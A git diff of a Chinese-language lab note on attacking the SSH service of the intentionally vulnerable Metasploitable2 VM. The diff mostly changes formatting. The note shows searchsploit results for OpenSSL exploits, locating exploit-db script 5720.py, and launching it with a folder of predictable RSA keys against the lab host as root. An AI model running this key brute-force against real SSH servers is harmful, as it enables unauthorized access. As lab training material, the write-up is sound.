@@ -1,9 +1,10 @@
 ## 渗透metasploitable2的SSHD服务
-1. 前面使用nmap扫描端口，看到ssh的端口也是开放的，尝试渗透sshd服务
-2. 搜索exploit-db找到可利用的脚本
+1、前面使用nmap扫描端口，看到ssh的端口也是开放的，尝试渗透sshd服务
+2、搜索exploit-db找到可利用的脚本
 ```bash 
 [root@kali: ~#] searchsploit openssl
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------- Description                                                                                                                                    |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------- 
+Description                                                                                                                                    |  Path
 ----------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------
 OpenSSL ASN.1<= 0.9.6j <= 0.9.7b - Brute Forcer for Parsing Bugs                                                                               | /multiple/dos/146.c
 Apache OpenSSL - Remote Exploit (Multiple Targets) (OpenFuckV2.c)                                                                              | /linux/remote/764.c
@@ -31,12 +32,12 @@ PHP 5.x OpenSSL Extension openssl_encrypt Function Plaintext Data Memory Leak Do
 PHP 5.x OpenSSL Extension x Function openssl_decrypt Ciphertext Data Memory Leak DoS                                                           | /php/dos/35487.php
 ----------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------
 ```
-3. 找到5720.py这个python脚本，先找到exploit-db的脚本位置
+3、找到5720.py这个python脚本，先找到exploit-db的脚本位置
 ```bash
 [root@kali: ~#] locate 5720.py
 /usr/share/exploitdb/platforms/linux/remote/5720.py
 ```
-4. 阅读下这个脚本
+4、阅读下这个脚本
 ```bash
 [root@kali: ~#] cat /usr/share/exploitdb/platforms/linux/remote/5720.py | more
 ############################################################################
@@ -62,7 +63,7 @@ PHP 5.x OpenSSL Extension x Function openssl_decrypt Ciphertext Data Memory Leak
 #花了一点时间，查看到底有多少个密钥文件
 [root@kali: ~#] ls -l rsa/2048/ |wc -l
 65537
-#看脚本说明，貌似跟前面的密码暴力破解是一个原理?
+#看脚本使用说明，貌似跟前面的密码暴力破解是一个原理?
 #先跑起来看看哦~~~
 [root@kali: ~#] python /usr/share/exploitdb/platforms/linux/remote/5720.py rsa/2048/ metasploitable2 root 22
 ....
